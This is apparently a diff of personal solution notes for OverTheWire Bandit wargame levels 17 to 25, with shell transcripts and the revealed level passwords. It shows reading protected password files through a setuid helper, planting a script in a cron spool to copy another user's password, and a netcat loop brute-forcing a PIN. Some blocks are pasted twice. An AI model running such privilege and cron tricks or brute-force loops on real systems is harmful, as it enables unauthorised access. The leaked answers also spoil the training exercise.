@@ -58,5 +58,113 @@ b16 -> b17
 	31691/tcp open  unknown
 	31790/tcp open  unknown
 
+b17 -> b18
+	bandit17@melinda:~$ diff passwords.old passwords.new
+	42c42
+	< BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
+	---	
+	> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+b18 -> b19
+	[griff@datz-Antergos overthewire]$ ssh -f 
+	bandit18@bandit.labs.overthewire.org cat readme
+	[griff@datz-Antergos overthewire]$ 
+	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 	
+b19 -> b20
+	bandit19@melinda:~$ ls
+	bandit20-do
+	bandit19@melinda:~$ ./bandit20-do
+	Run a command as another user.
+  	   Example: ./bandit20-do id
+	bandit19@melinda:~$ cat /etc/bandit_pass/bandit20
+	cat: /etc/bandit_pass/bandit20: Permission denied
+	bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+	GbKksEFF4yrVs6il55v6gwY5aVje5f0jbandit19@melinda:~$ ls
+	bandit20-do
+	bandit19@melinda:~$ ./bandit20-do
+	Run a command as another user.
+  	   Example: ./bandit20-do id
+	bandit19@melinda:~$ cat /etc/bandit_pass/bandit20
+	cat: /etc/bandit_pass/bandit20: Permission denied
+	bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+	GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+b21 -> b22
+	bandit21@melinda:~$ ls /etc/cron.d
+	behemoth4_cleanup  cronjob_bandit24       melinda-stats          natas25_cleanup~  semtex0-32   sysstat
+	cron-apt           cronjob_bandit24_root  natas-session-toucher  natas26_cleanup   semtex0-64   vortex0
+	cronjob_bandit22   leviathan5_cleanup     natas-stats            natas27_cleanup   semtex0-ppc  vortex20
+	cronjob_bandit23   manpage3_resetpw_job   natas25_cleanup        php5              semtex5
+	bandit21@melinda:~$ cat /etc/cron.d/cronjob_bandit22
+	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+	bandit21@melinda:~$ /usr/bin/cronjob_bandit22.sh
+	chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
+	/usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
+	bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLIbandit21@melinda:~$ ls /etc/cron.d
+	behemoth4_cleanup  cronjob_bandit24       melinda-stats          natas25_cleanup~  semtex0-32   sysstat
+	cron-apt           cronjob_bandit24_root  natas-session-toucher  natas26_cleanup   semtex0-64   vortex0
+	cronjob_bandit22   leviathan5_cleanup     natas-stats            natas27_cleanup   semtex0-ppc  vortex20
+	cronjob_bandit23   manpage3_resetpw_job   natas25_cleanup        php5              semtex5
+	bandit21@melinda:~$ cat /etc/cron.d/cronjob_bandit22
+	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+	bandit21@melinda:~$ /usr/bin/cronjob_bandit22.sh
+	chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
+	/usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied
+	bandit21@melinda:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+b22 -> b23
+	bandit22@melinda:~$ ls /etc/cron.d
+	behemoth4_cleanup  cronjob_bandit23       leviathan5_cleanup    natas-session-toucher  natas25_cleanup~  php5        semtex0-ppc  vortex0
+	cron-apt           cronjob_bandit24       manpage3_resetpw_job  natas-stats            natas26_cleanup   semtex0-32  semtex5      vortex20
+	cronjob_bandit22   cronjob_bandit24_root  melinda-stats         natas25_cleanup        natas27_cleanup   semtex0-64  sysstat
+	bandit22@melinda:~$ more /etc/cron.d/cronjob_bandit23   
+	* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+	bandit22@melinda:~$ more /usr/bin/cronjob_bandit23.sh
+	#!/bin/bash
+
+	myname=$(whoami)
+	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 	
+	echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+	cat /etc/bandit_pass/$myname > /tmp/$mytarget
+	########################################################################
+	change myname=$(whoami) to myname=bandit23 to get the filename!
+	#######################################################################
+	bandit22@melinda:~$ echo $(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+	8ca319486bfbbc3663ea0fbe81326349
+	bandit22@melinda:~$ more /tmp/8ca319486bfbbc3663ea0fbe81326349
+	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+b23 -> b24
+	bandit23@melinda:~$ more /tmp/gr/script.sh 
+	#!/bin/sh
+	mkdir /tmp/gr24
+	cat /etc/bandit_pass/bandit24 >> /tmp/gr24/bandit24pass
+	touch /tmp/gr24/ok
+	bandit23@melinda:~$ chmod 777 /tmp/gr/script.sh
+	bandit23@melinda:~$ cp /tmp/gr/script.sh /var/spool/bandit24
+	bandit23@melinda:~$ ls /tmp/gr24
+	bandit24pass  ok
+	bandit23@melinda:~$ cat /tmp/gr24/bandit24pass 
+	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+b24 -> b25
+	bandit24@melinda:~$ /tmp/gr/script.sh 
+	bandit24@melinda:~$ nano /tmp/gr/script.sh
+		#!/bin/bash		
+	
+		for i in {1000..9999};
+		do
+        		echo $i
+        		echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002 
+		done
+
+
+	5669
+	I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+	Correct!
+	The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
